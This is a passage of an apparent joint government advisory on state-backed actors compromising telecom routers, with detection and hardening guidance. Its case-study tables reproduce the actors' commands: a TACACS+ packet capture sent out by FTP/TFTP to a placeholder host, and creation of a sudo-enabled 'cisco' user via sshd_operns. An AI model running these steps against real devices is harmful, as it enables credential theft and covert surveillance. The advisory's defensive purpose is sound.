href=\"https://attack.mitre.org/versions/v17/techniques/T1199/\" target=\"_blank\" title=\"T1199\">T1199</a>]. In some instances, the actors modify routing and enable traffic mirroring (switch port analyzer (SPAN)/remote SPAN (RSPAN)/encapsulated remote SPAN (ERSPAN) where available) on compromised network devices and configure Generic Routing Encapsulation (GRE)/IPsec tunnels and static routes to achieve the same goal [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1095/\" target=\"_blank\" title=\"T1095\">T1095</a>]. Additionally, these APT actors often simultaneously exploit large numbers of vulnerable, Internet-exposed devices across many IP addresses and may revisit individual systems for follow-on operations.</p>\n<p>Initial access vectors remain a critical information gap for parties working to understand the scope, scale, and impact of the actors’ malicious activity. The authoring agencies encourage organizations to provide compromise details to appropriate authorities (see <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a#Contactinfo\" title=\"Contact Information\">Contact information</a>) to continue improving all parties’ understanding and responses.</p>\nPersistence\n<p>To maintain persistent access to target networks, the APT actors use a variety of techniques. Notably, a number of these techniques can obfuscate the actors’ source IP address in system logs, as their actions may be recorded as originating from local IP addresses [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1027/\" target=\"_blank\" title=\"T1027\">T1027</a>]. Specific APT actions include:</p>\n<ul>\n<li>Modifying Access Control Lists (ACLs) to add IP addresses. This alteration allows the actors to bypass security policies and maintain ongoing access by explicitly permitting traffic from a threat actor-controlled IP address [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1562/004/\" target=\"_blank\" title=\"T1562.004\">T1562.004</a>].\n<ul>\n<li>The APT actors often named their ACLs “access-list 20”. When 20 was already used, the actors commonly used 50 or 10.</li>\n</ul>\n</li>\n<li>Opening standard and non-standard ports, which can open and expose a variety of different services (e.g., Secure Shell [SSH], Secure File Transfer Protocol [SFTP], Remote Desktop Protocol [RDP], File Transfer Protocol [FTP], HTTP, HTTPS) [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1071/\" target=\"_blank\" title=\"T1071\">T1071</a>]. This strategy supplies multiple avenues for remote access and data exfiltration. Additionally, utilizing non-standard ports can help the APT actors evade detection by security monitoring tools that focus on standard port activity [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1571/\" target=\"_blank\" title=\"T1571\">T1571</a>].\n<ul>\n<li>The APT actors have been enabling SSH servers and opening external-facing ports on network devices to maintain encrypted remote access [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1021/004/\" target=\"_blank\" title=\"T1021.004\">T1021.004</a>]. In some cases, the SSH services were established on high, non-default Transmission Control Protocol (TCP) ports using the port numbering scheme of <code>22x22</code> or <code>xxx22</code>, though port patterns may vary across intrusions. The actors may add keys to existing SSH services to regain entry into network devices [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1098/004/\" target=\"_blank\" title=\"T1098.004\">T1098.004</a>].</li>\n<li>The APT actors enable or abuse built-in HTTP/HTTPS management servers and sometimes reconfigure them to non-default high ports. <strong>Note: </strong>HTTP servers have been observed using the port numbering scheme of <code>18xxx</code>.\n<ul>\n<li>Enabling HTTP/HTTPS servers on Cisco devices affected by CVE-2023-20198. If the web UI feature is enabled on Cisco IOS XE Software, this vulnerability provides an entry opportunity for the APT actors.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Following compromise of a router, the following commands and activities have been observed on compromised devices [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1059/008/\" target=\"_blank\" title=\"T1059.008\">T1059.008</a>]:\n<ul>\n<li>Executing commands via SNMP [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1569/\" target=\"_blank\" title=\"T1569\">T1569</a>].</li>\n<li>SSH activity from remote or local IP addresses.</li>\n<li>Web interface panel (POST) requests.</li>\n<li>When present, using service or automation credentials (e.g., those used by configuration-archival systems such as RANCID) to enumerate and access other networking devices.</li>\n<li>Executing Tcl scripts (e.g., <code>TCLproxy.tcl</code> and <code>map.tcl</code>) on Cisco IOS devices where <code>tclsh</code> was available.</li>\n</ul>\n</li>\n<li>Depending on the configuration of the Simple Network Management Protocol (SNMP) on the compromised network device, the APT actors enumerate and alter the configurations for other devices in the same community group, when possible [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1021/\" target=\"_blank\" title=\"T1021\">T1021</a>]. <strong>Note</strong>: Properly configured SNMPv3 is considerably more secure than previous versions.\n<ul>\n<li>Utilizing SNMPwalk (SNMP GET/WALK) to enumerate devices from APT actor-controlled hosts. Where configuration changes were observed, they were issued as SNMP SET requests to writable objects from those hosts [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1016/\" target=\"_blank\" title=\"T1016\">T1016</a>].</li>\n</ul>\n</li>\n<li>Creating tunnels over protocols, such as Generic Routing Encapsulation (GRE), multipoint GRE (mGRE), or IPsec, on network devices, presumably based on what would be expected in the environment [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1572/\" target=\"_blank\" title=\"T1572\">T1572</a>].\n<ul>\n<li>These tunnels allow for the encapsulation of multiple network layer protocols over a single tunnel, which can create persistent and covert channels for data transmission to blend in with normal network traffic.</li>\n<li>Some of these actions may obscure the APT actors’ source IP address in logs due to being logged as a local IP.</li>\n</ul>\n</li>\n<li>Running commands in an on-box Linux container on supported Cisco networking devices to stage tools, process data locally, and move laterally within the environment. This often allows the APT actors to conduct malicious activities undetected because activities and data within the container are not monitored closely.

On NX-OS devices specifically, using <code>dohost</code> to script host-level CLI actions for reconnaissance and persistence. For Cisco IOS XE, Guest Shell is a Linux container (LXC) managed by IOx that is enabled with <code>guestshell enable</code> and accessed with <code>guestshell run bash</code>. By default, processes inside Guest Shell egress via the management virtual routing and forwarding (VRF) instance. On platforms without a dedicated management port, connectivity can be provided with a <code>VirtualPortGroup</code> interface. Guest Shell can execute Python and other 64-bit Linux applications and can read/write device-accessible storage (e.g., flash) as configured.

It has direct access to <code>bootflash:</code> and can invoke host NX-OS CLI via the <code>dohost</code> utility. Networking uses the device’s default VRF by default. Operators (or malware) can run commands in other VRFs using <code>chvrf</code>. Systemd-managed services are typically long-running components inside Guest Shell.</li>\n<li>Using <code>guestshell disable</code> and <code>guestshell destroy</code> commands to deactivate and uninstall Guest Shell container and return all resources to the system [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1070/009/\" target=\"_blank\" title=\"T1070.009\">T1070.009</a>].</li>\n</ul>\n</li>\n<li>Leveraging open source multi-hop pivoting tools, such as STOWAWAY, to build chained relays for command and control (C2) and operator access, including interactive remote shells, file upload and download, SOCKS5/HTTP proxying, and local/remote port mapping with support for forward and reverse connections over encrypted node-to-node links [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1090/003/\" target=\"_blank\" title=\"T1090.003\">T1090.003</a>].</li>\n</ul>\nLateral movement &amp; collection\n<p>Following initial access, the APT actors target protocols and infrastructure involved in authentication—such as Terminal Access Controller Access Control System Plus (TACACS+)—to facilitate lateral movement across network devices, often through SNMP enumeration and SSH. From these devices, the APT actors passively collect packet capture (PCAP) from specific ISP customer networks [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1040/\" target=\"_blank\" title=\"T1040\">T1040</a>] [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1005/\" target=\"_blank\" title=\"T1005\">T1005</a>]. To further support discovery and lateral movement, the APT actors may target: </p>\n<ul>\n<li>Authentication Protocols including TACACS+ and Remote Authentication Dial-In User Service (RADIUS)</li>\n<li>Managed Information Base (MIB) [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1602/001/\" target=\"_blank\" title=\"T1602.001\">T1602.001</a>]</li>\n<li>Router interfaces</li>\n<li>Resource Reservation Protocol (RSVP) sessions</li>\n<li>Border Gateway Protocol (BGP) routes</li>\n<li>Installed software</li>\n<li>Configuration files [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1590/004/\" target=\"_blank\" title=\"T1590.004\">T1590.004</a>] [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1602/002/\" target=\"_blank\" title=\"T1602.002\">T1602.002</a>]\n<ul>\n<li>This is achieved either from existing sources in the network (e.g., output of provider scripts) or through active survey of devices and Trivial File Transfer Protocol (TFTP), to include Multiprotocol Label Switching (MPLS) configuration information.</li>\n</ul>\n</li>\n<li>In-transit network traffic using native capabilities to capture or mirror traffic via the SPAN, RSPAN, or ERSPAN capabilities available on many router models.</li>\n<li>Provider-held data, such as:\n<ul>\n<li>Subscriber information</li>\n<li>User content</li>\n<li>Customer records and metadata</li>\n<li>Network diagrams, inventories, device configurations, and vendor lists</li>\n<li>Passwords</li>\n</ul>\n</li>\n</ul>\n<p>Capturing network traffic containing credentials via compromised routers is a common method for further enabling lateral movement [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1040/\" target=\"_blank\" title=\"T1040\">T1040</a>]. This typically takes the form of:</p>\n<ul>\n<li>Leveraging native PCAP functionalities (e.g., Cisco’s Embedded Packet Capture) on routers to collect RADIUS or TACACS+ authentication traffic, which may contain credentials transmitted in cleartext or weakly protected forms.\n<ul>\n<li>PCAPs have been observed containing naming schemes such as <code>mycap.pcap</code>, <code>tac.pcap</code>, <code>1.pcap</code>, or similar variations.</li>\n</ul>\n</li>\n<li>Modifying a router’s TACACS+ server configuration to point to an APT actor-controlled IP address [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1556/\" target=\"_blank\" title=\"T1556\">T1556</a>]. These actors may use this capability to capture authentication attempts from network administrators or other devices. They may also adjust Authentication, Authorization, and Accounting (AAA) configurations, forcing devices to use less secure authentication methods or send accounting information to their infrastructure.</li>\n</ul>\n<p>The APT actors collect traffic at Layer 2 or 3 (depending on the protocol used), largely from Cisco IOS devices; however, targeting of other device types is also likely. Based on analysis, the APT actors hold interest in making configuration and routing changes to the devices after compromising the routers. While some actions are specific to Cisco devices, the actors are capable of targeting devices from other vendors and could utilize similar functionality. The APT actors perform several of the modifications or techniques below to facilitate follow-on actions.</p>\n<ul>\n<li>Creating accounts/users and assigning privileges to those accounts, often via modifying router configurations [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1136/001/\" target=\"_blank\" title=\"T1136.001\">T1136.001</a>].\n<ul>\n<li>Brute forcing and re-using credentials to access Cisco devices. If a router configuration is collected during initial exploitation and contains a weak hashed Cisco Type 5 (MD5) or 7 (legacy, weak reversible encoding) password [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1003/\" target=\"_blank\" title=\"T1003\">T1003</a>] [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1110/002/\" target=\"_blank\" title=\"T1110.002\">T1110.002</a>]. Weak credentials, such as “cisco” as the username and password, are routinely exploited through these techniques.</li>\n</ul>\n</li>\n<li>Scanning for open ports and services and mirroring (SPAN/RSPAN sessions), allowing traffic monitoring from multiple interfaces [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1595/\" target=\"_blank\" title=\"T1595\">T1595</a>].</li>\n<li>Running commands on the router via SNMP, SSH, and HTTP GET or POST requests. These requests typically target privileged execution paths, such as <code>/level/15/exec/-/*</code>, and may include instructions to display configuration files, access BGP routes, manage VRF instances, or clear system logs [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1082/\" target=\"_blank\" title=\"T1082\">T1082</a>].\n<ul>\n<li>Many compromised devices use well known SNMP community strings, including “public” and “private”.</li>\n</ul>\n</li>\n<li>Configuring PCAP capabilities to collect network traffic.</li>\n<li>Configuring tunnels.</li>\n<li>Using monitoring tools present in the environment to monitor a device’s (commonly a router’s) configuration changes.</li>\n<li>Updating routing tables to route traffic to actor-controlled infrastructure.</li>\n<li>Using several techniques to avoid detection of their activity, including:\n<ul>\n<li>Deleting and/or clearing logs, possibly in tandem with reverting or otherwise modifying stored configuration files to avoid leaving traces of the modifications [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1070/\" target=\"_blank\" title=\"T1070\">T1070</a>].</li>\n<li>Disabling logging and/or disabling sending logs to central servers.</li>\n<li>Stopping/starting event logging on network devices.</li>\n<li>Configuring a Cisco device to run a Guest Shell container to evade detection from collecting artifacts, data, or PCAP [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1610/\" target=\"_blank\" title=\"T1610\">T1610</a>].</li>\n</ul>\n</li>\n</ul>\nExfiltration\n<p>A key concern with exfiltration is the APT actors’ abuse of peering connections (i.e., a direct interconnection between networks that allows traffic exchange without going through an intermediary) [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1599/\" target=\"_blank\" title=\"T1599\">T1599</a>]. Exfiltration may be facilitated due to a lack of policy restraints or system configurations limiting the types of data received by peered ISPs.</p>\n<p>Analysis indicates that the APT actors leverage separate (potentially multiple) command and control channels for exfiltration to conceal their data theft within the noise of high-traffic nodes, such as proxies and Network Address Translation (NAT) pools. The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1048/003/\" target=\"_blank\" title=\"T1048.003\">T1048.003</a>].</p>\n<strong>Case study</strong>\n<p>This section details techniques employed by the APT actors, as well as indicators received from analysis to detect this activity. The APT actors were stopped before further actions could be taken on the compromised network.</p>\nCollecting native PCAP\n<p>The APT actors collected PCAPs using native tooling on the compromised system, with the primary objective likely being to capture TACACS+ traffic over TCP port 49. TACACS+ packet bodies can be decrypted if the encryption key is known. In at least one case, the device configuration stored the TACACS+ shared secret using Cisco Type 7 reversible obfuscated encoding. Recovering that secret from the configuration would enable offline decryption of captured TACACS+ payloads. TACACS+ traffic is used for authentication, often for administration of network equipment and including highly privileged network administrators accounts and credentials, likely enabling the actors to compromise additional accounts and perform lateral movement. <br>The commands listed in<strong> Table 1</strong> were observed on a Cisco IOS XE-based host to aid PCAP exfiltration.</p>\n\n<strong>Table 1</strong>: Commands to collect PCAP\n\n\nCommand    \nDescription\n\n\n\n\nmonitor capture mycap interface &lt;interface-name&gt; both\nSet up a packet capture named 'mycap'\n\n\nmonitor capture mycap match ipv4 protocol tcp any any eq 49 \nTarget port 49 on the above interface - TACACS+\n\n\nmonitor capture mycap buffer size 100\n\n\nmonitor capture mycap start\nStart the capture\n\n\nshow monitor capture mycap buffer brief\nCheck status of capture\n\n\nmonitor capture mycap export bootflash:tac.pcap\nExport PCAP to file, staging for exfiltration\n\n\ncopy bootflash:tac.pcap ftp://&lt;domain/service&gt;:*@&lt;IP&gt;\nExfiltration\n\n\ncopy bootflash:tac.pcap tftp://&lt;IP&gt;/tac.pcap\n\n\n\n<br><strong>Host-level indicators</strong>\n<p>If console logging or visibility of remote FTP/TFTP from a network appliance are available, the following host-level indicators may assist with detecting activity: </p>\n<p><code>Capture name: 'mycap' </code><br><code>Capture rule: 'match ipv4 protocol tcp any any eq 49' </code><br><code>Exported pcap filename: 'tac.pcap'</code></p>\n<p><code>tftp remote filename: 'tac.pcap' </code><br><code>tftp remote IP: [remote IP]</code> </p>\nEnabling SSH access to the underlying Linux host on IOS XR\n<p>Cisco IOS XR (64-bit) is a Linux-based network operating system built on a Yocto-based Wind River Linux distribution. IOS XR is typically administered via the IOS XR CLI over SSH on port TCP/22 or via console. </p>\n<p>The built-in <code>sshd_operns</code> service exposes an additional SSH endpoint on the host Linux. When enabled, it listens on TCP/57722 and provides direct shell access to the host OS. Root logins are not permitted to this service, as only non-root accounts can authenticate.</p>\n<p>On IOS XR, <code>sshd_operns</code> is disabled by default and must be explicitly started (e.g., service sshd_operns start). Persistence across reboots requires enabling at <code>init</code> (<code>chkconfig</code>) or equivalent.</p>\n<p>In observed intrusions, the APT actors enabled <code>sshd_operns</code>, created a local user, and granted it sudo privileges (e.g., by editing <code>/etc/sudoers</code> or adding a file under <code>/etc/sudoers.d/</code>) to obtain root on the host OS after logging in via TCP/57722. </p>\n<p>The commands listed in <strong>Table 2</strong> were executed from the host Linux bash shell as root.</p>\n\n<strong>Table 2</strong>: Commands to add user to sudoers\n\n\nCommand    \nDescription\n\n\n\n\nservice sshd_operns start\nStarting the sshd_operns service\n\n\n\n<p>useradd cisco</p>\n<p>password cisco</p>\n\nAdding a new user\n\n\nsudo vi /etc/sudoers\nAdding the new user to sudoers\n\n\nchmod 4755 /usr/bin/sudo\nAs 4755 is the default permissions for sudo, it is unclear why the actors executed this command\n\n\n\n<strong>Threat hunting guidance</strong>\n<p>The authoring agencies encourage network defenders of critical infrastructure organizations, especially telecommunications organizations, to perform threat hunting, and, when appropriate, incident response activities. If malicious activity is suspected or confirmed, organizations should consider all mandatory reporting requirements to relevant agencies and regulators under applicable laws and regulations, and any additional voluntary reporting to appropriate agencies, such as cybersecurity or law enforcement agencies who can provide incident response guidance and assistance with mitigation. See the <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a#Contactinfo\" title=\"Contact Information\">Contact information</a> section for additional reporting information.</p>\n<p>The malicious activity described in this advisory often involves persistent, long-term access to networks where the APT actors maintain several methods of access. Network defenders should exercise caution when sequencing defensive measures to maximize the chance of achieving full eviction, while remaining compliant with applicable laws, regulations, and guidance on incident response and data breach notifications in their jurisdictions. Where possible, gaining a full understanding of the APT actors’ extent of access into networks followed by simultaneous measures to remove them may be necessary to achieve a complete and lasting eviction. Partial response actions may alert the actors to an ongoing investigation and jeopardize the ability to conduct full eviction. Incident response on one network may also result in the APT actors taking measures to conceal and maintain their access on additional compromised networks, and potentially disrupt broader investigative and operational frameworks already in progress.</p>\n<p>The APT actors often take steps to protect their established access, such as compromising mail servers or administrator devices/accounts to monitor for signs that their activity has been detected. Organizations should take steps to protect the details of their threat hunting and incident response from APT actor monitoring activities.</p>\n<p>The authoring agencies strongly encourage organizations to conduct the following actions for threat hunting:</p>\nMonitor configurations changes\n<ul>\n<li>Pull all configurations for running networking equipment and check for differences with latest authorized versions.\n<ul>\n<li>Review remote access configurations for proper application of ACL and transport protocols. Review ACLs for any unauthorized modifications.</li>\n<li>If SNMP is being used, ensure networking equipment is configured to use SNMPv3 with the appropriate authentication and privacy configurations set, as defined in the User-based Security Model (USM) and the View-based Access Control Model (VACM).</li>\n<li>Verify the authenticity of any configured local accounts and their permission levels.</li>\n</ul>\n</li>\n<li>Check all routing tables to ensure that all routes are authorized and expected.</li>\n<li>Verify that any PCAP commands configured on networking equipment are authorized.</li>\n</ul>\nMonitor virtualized containers\n<ul>\n<li>If networking equipment has the capability to run virtualized containers, ensure that all running virtualized containers are expected and authorized.</li>\n<li>For devices that support Cisco Guest Shell (IOS XE and NX-OS), do not rely on device syslog alone to detect actor activity. Use a combination of device syslog, AAA command accounting, container (Guest Shell) logs, and off-box flow/telemetry.</li>\n<li>Capture lifecycle and CLI activity with AAA accounting (TACACS+/RADIUS) for configuration/exec commands so that enable/disable and entry actions are recorded.</li>\n<li>For IOS XE, hunt for <code>guestshell enable</code>, <code>guestshell run bash</code>, and <code>guestshell disable</code>. On NX-OS, hunt for <code>guestshell enable</code>, <code>run guestshel</code>l, and <code>guestshell destroy</code>. Alert on unexpected use of <code>chvrf</code> (running commands under a different VRF) and, on NX-OS, use of <code>dohost</code> (container invoking host CLI).</li>\n</ul>\nMonitor network services and tunnels\n<ul>\n<li>Monitor for management services running on non-standard ports (SSH, FTP, etc.).</li>\n<li>Hunt for actor-favored protocol patterns:\n<ul>\n<li>SSH on high non-default ports with 22x22/xxx22 numbering patterns from non-admin source IPs.</li>\n<li>HTTPS/Web UI listeners on non-default high ports (18xxx) reachable from outside the management VRF.</li>\n<li>TCP/57722 (IOS XR <code>sshd_operns</code>) reachability or flows.\n<ul>\n<li>Hunt for TCP/57722 listeners on IOS XR platforms (the host Linux <code>sshd_operns</code> service). Collect flow/telemetry (NetFlow/IPFIX) from the management VRF. Any inbound TCP/57722 should be treated as high-risk if unexpected.</li>\n</ul>\n</li>\n<li>TACACS+ (TCP/49) flows to non-approved IPs or any TACACS+ traffic leaving the management VRF. Correlate with device configuration to detect redirection of TACACS+ servers to APT actor-controlled infrastructure.</li>\n<li>FTP/TFTP flows originating from network devices to unapproved destinations, especially when preceded by on-box PCAP collection activity.</li>\n</ul>\n</li>\n<li>Audit any tunnel that transits a security boundary, such as peering points between providers, to ensure it can be accounted for by network administrators. In particular, examine:\n<ul>\n<li>Unexplained or unexpected tunnels between Autonomous System Numbers (ASNs).</li>\n<li>Unauthorized use of file transfer protocols, such as FTP and TFTP.\n<ul>\n<li>Monitor network traffic for abnormal volumes of files transfers to internal FTP servers, which the APT actors may use as staging areas prior to data exfiltration.</li>\n</ul>\n</li>\n<li>Extensive SSH activity against routers, followed by the establishment of both an incoming tunnel and outgoing tunnel—each of which may leverage different protocols.</li>\n</ul>\n</li>\n</ul>\nMonitor firmware and software integrity\n<ul>\n<li>Perform hash verification on firmware and compare values against the vendor's database to detect unauthorized modification to the firmware.

In particular, check for:\n<ul>\n<li>Unexpected GRE or other tunneling protocols, especially with foreign infrastructure [<a href=\"https://d3fend.mitre.org/technique/d3f:NetworkTrafficCommunityDeviation/\" target=\"_blank\" title=\"D3-NTCD\">D3-NTCD</a>].</li>\n<li>Unexpected external IPs set as a TACACS+ or RADIUS server, or other AAA service configuration modifications.</li>\n<li>Unexpected external IPs in ACLs.</li>\n<li>Unexpected packet capture or network traffic mirroring settings.</li>\n<li>Unexpected virtual containers running on network devices, or, where virtual containers are expected, unexpected commands within the containers.</li>\n</ul>\n</li>\n<li>Employ a robust change management process that includes periodic auditing of device configurations [<a href=\"https://d3fend.mitre.org/technique/d3f:PlatformMonitoring/\" target=\"_blank\" title=\"D3-PM\">D3-PM</a>].\n<ul>\n<li>Ensure all networking configurations are stored, tracked, and regularly audited via a change management process. A change management process audits approved configurations against what is currently running in an organization’s infrastructure.</li>\n<li>Review firewall rule creation and modification dates, cross referencing against change management approvals, to detect unauthorized rules or rule changes.</li>\n<li>Create alarms or alerts for unusual router administration access, commands, or other activity.</li>\n</ul>\n</li>\n<li>Attempt to identify the full scope of a suspected compromise before mitigating. While it is important to contain the intrusion and prevent further malicious activity, if the full scope is not identified and mitigated fully, the actors may retain access and cause further malicious activity. Threat hunting and incident response efforts should be balanced against the total potential malicious activity with the goals of full eviction and minimizing damage.\n<ul>\n<li>An established compromise by these APT actors will likely include recurring, large-scale exfiltration from the compromised network. In at least one instance, the APT actors utilized GRE and MPLS tunnels to move data back to China.</li>\n</ul>\n</li>\n<li>Disable outbound connections from management interfaces to limit possible lateral movement activity between network devices [<a href=\"https://d3fend.mitre.org/technique/d3f:OutboundTrafficFiltering/\" target=\"_blank\" title=\"D3-OTF\">D3-OTF</a>].</li>\n<li>Disable all unused ports and protocols (both traffic and management protocols) [<a href=\"https://d3fend.mitre.org/technique/d3f:ApplicationConfigurationHardening/\" target=\"_blank\" title=\"D3-ACH\">D3-ACH</a>]. Only use encrypted and authenticated management protocols (e.g., SSH, SFTP/SCP, HTTPS) and disable all others, especially unencrypted protocols (e.g., Telnet, FTP, HTTP).</li>\n<li>Change all default administrative credentials, especially for network appliances and other network devices [<a href=\"https://d3fend.mitre.org/technique/d3f:ChangeDefaultPassword/\" target=\"_blank\" title=\"D3-CFP\">D3-CFP</a>].</li>\n<li>Require public-key authentication for administrative roles.

Minimize authentication attempts and lockout windows to slow brute force and sprayed attempts [<a href=\"https://d3fend.mitre.org/technique/d3f:CredentialHardening/\" target=\"_blank\" title=\"D3-CH\">D3-CH</a>].</li>\n<li>Use the vendor recommended version of the network device operating system and keep it updated with all patches. Upgrade unsupported network devices to ones that are supported by the vendor with security updates [<a href=\"https://d3fend.mitre.org/technique/d3f:SoftwareUpdate/\" target=\"_blank\" title=\"D3-SU\">D3-SU</a>].</li>\n</ul>\nHardening management protocols and services\n<ul>\n<li>Implement management-plane isolation and control-plane policing (CoPP) [<a href=\"https://d3fend.mitre.org/technique/d3f:NetworkIsolation/\" target=\"_blank\" title=\"D3-NI\">D3-NI</a>].\n<ul>\n<li>Place all device management services (SSH, HTTPS, SNMP, TACACS+/RADIUS, SCP/SFTP) strictly in a dedicated out-of-band management network or a management VRF.</li>\n<li>Ensure this management VRF has no route leakage to customers or peering VRFs and cannot initiate or receive sessions from data-plane or peering address space [<a href=\"https://d3fend.mitre.org/technique/d3f:InboundTrafficFiltering/\" target=\"_blank\" title=\"D3-ITF\">D3-ITF</a>].</li>\n<li>Block all egress from the management VRF except to explicitly authorized AAA/syslog/NetFlow/IPFIX/telemetry collectors to prevent actor use of management interfaces as lateral movement conduits or exfiltration paths.</li>\n<li>Apply explicit management-plane ACLs at the control plane (e.g., CoPP/CPPr) to allowlist (i.e., default-deny) and rate-limit management protocols. Allow only approved management station IPs/subnets and jump servers.\n<ul>\n<li>Apply these restrictions to all SNMP, TACACS+/RADIUS (TCP/UDP 49/1812/1813), HTTPS (TCP/443 and any configured non-default port), SSH (TCP/22 and any configured non-default port), and SFTP/SCP.</li>\n<li>For devices that do not support ACLs, place on a separate management Virtual Local Area Network (VLAN); an ACL can be applied to this management VLAN from an upstream device, such as a router or Layer 3 switch.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Use SSHv2 only and disable Telnet. Audit and restrict SSH on non-default ports (e.g., 22x22 and xxx22 patterns) commonly used by the APT actors.</li>\n<li>If a web interface is operationally required, bind it only to the management VRF/interface. Use HTTPS only and disable unencrypted HTTP. Require AAA for web interface access. Monitor and alert on non-default high HTTPS ports (e.g., 18xxx) observed in intrusions.</li>\n<li>Use SNMPv3 only, and disable SNMPv1 and SNMPv2. Configure Trusted Managers and ACLs to limit SNMP access to only trusted devices.\n<ul>\n<li>Change all weak and default SNMP community strings.</li>\n<li>Restrict and monitor SNMP writes.</li>\n<li>Enforce SNMPv3 with authPriv and apply VACM views that exclude configuration-altering MIB objects from write access. Only grant read access for required OIDs; reserve write access for tightly scoped automation accounts from approved managers.</li>\n</ul>\n</li>\n<li>Continuously monitor SNMP SET operations and alert on changes to AAA servers, HTTP/HTTPS enablement or port changes, tunnel interfaces, SPAN/ERSPAN sessions, and routing and ACL objects. Actor tradecraft includes issuing SNMP SETs to make covert configuration changes at scale.</li>\n<li>Configure only strong cryptographic cipher suites for all management protocols (e.g., SSH, SFTP, HTTPS) and reject all weak ones.</li>\n<li>Enforce per-protocol rate limits (particularly for SSH, HTTPS, SNMP, TACACS+/RADIUS) to blunt credential-guessing and slow “low-and-slow\" abuse of built-in functions (e.g., Embedded Packet Capture, tunnel setup) without denying legitimate admin access.</li>\n<li>Eliminate unintended IPv6 management exposure.\n<ul>\n<li>If IPv6 is enabled, apply equivalent controls for IPv6 as for IPv4.</li>\n<li>Enforce management-plane ACLs and CoPP for IPv6. Bind management services only to the management VRF/interface in IPv6.</li>\n<li>Audit for IPv6-reachable management services and tunnels, as the APT actors’ infrastructure includes IPv6 addresses. </li>\n</ul>\n</li>\n</ul>\nImplementing robust logging\n<ul>\n<li>Ensure logging is enabled and forwarded to a centralized server. Set the trap and buffer logging levels on each device to at least syslog level “informational” (code 6) to collect all necessary information.</li>\n<li>Ensure all logs sent to a centralized logging server are transmitted via a secure, authenticated, and encrypted channel (such as IPsec, TLS, or SSH tunnels). The central server should maintain immutable logs with retention periods sufficient to support cybersecurity incident response investigations and comply with applicable retention policies.</li>\n<li>Enable AAA command accounting for privileged commands to record any attempts to invoke those commands.</li>\n</ul>\nRouting best practices\n<ul>\n<li>Utilize routing authentication mechanisms, when possible.</li>\n<li>Protect peering and edge routing paths often abused for covert redirection.\n<ul>\n<li>Continuously validate static routes, policy-based routing (PBR), and VRF-leak policies at peering edges. Alert on additions that steer traffic toward non-standard GRE/IPsec endpoints or unexpected next hops.</li>\n</ul>\n</li>\n<li>Enforce maximum-prefix limits, strict prefix/AS-path filtering, and “only-expected” communities on all external BGP (eBGP) sessions. Deny default and overly broad routes.</li>\n<li>Enable TTL security (GTSM) or equivalent for eBGP to reduce off-path attack surface.</li>\n<li>Require session protection (TCP-AO where supported, otherwise MD5) and monitor for BGP session resets and parameter changes from unexpected management origins.</li>\n</ul>\nVirtual Private Network (VPN) best practices\n<ul>\n<li>Delete default VPN Internet Key Exchange (IKE) policies and associated components.</li>\n<li>Create IKE policies consistent with applicable requirements and guidance on cryptographic algorithm use.

Do not use Type 7 and transition from Type 5 (MD5) when possible.</li>\n<li>Use Type 6 (AES) key encryption to protect stored secrets (e.g., TACACS+/RADIUS shared secrets or IKE PSKs).</li>\n</ul>\n</li>\n<li>Disable outbound connections from the VTYs (e.g., <code>transport output none</code>). This prevents initiating SSH, Telnet, or other client sessions from the device via VTY, reducing its utility as a jump host. Monitor for any changes to this setting.</li>\n<li>Audit for unexpected enablement of IOS XR host SSH (<code>sshd_operns</code>) on TCP/57722. This is disabled by default, but has been observed being enabled by actors for persistence.</li>\n<li>When not required, disable the web configuration interface on applicable Cisco networking devices by running <code>no ip http server </code>and <code>no ip http secure-server</code>.\n<ul>\n<li>If management via a web interface is required, ensure to enable only the HTTPS management interface by running the command<code> ip http secure-server</code> and keep <code>no ip http server</code> configured to prevent unencrypted access via HTTP.</li>\n</ul>\n</li>\n<li>Ensure a final <code>deny any any log</code> line is added to all configured ACLs. This ensures that the denied connections are logged so they could be reviewed at a later date.</li>\n</ul>\n<strong>Mitigating Guest Shell abuse</strong>\n<ul>\n<li>Disable Guest Shell where not operationally required.\n<ul>\n<li>For IOS XE, run <code>guestshell disable</code> to stop the container. Where supported, disable the IOx subsystem with <code>no iox</code> to prevent container hosting entirely. Confirm with <code>show guestshell / show iox</code>.</li>\n<li>For NX-OS, run <code>guestshell disable</code> to stop the container. Use <code>guestshell destroy</code> to uninstall it and return resources to the system. Confirm with <code>show guestshell</code>.</li>\n</ul>\n</li>\n<li>Where Guest Shell is disabled, restrict (re)enabling Guest Shell.\n<ul>\n<li>Enforce AAA command authorization (TACACS+/RADIUS) so only approved roles can run <code>guestshell enable</code>, <code>guestshell run bash</code> (IOS XE), <code>run guestshell</code> (NX-OS), <code>guestshell disable/destroy</code>, <code>chvrf</code>, <code>dohost</code>, or IOx-related commands.</li>\n</ul>\n</li>\n<li>Where Guest Shell is 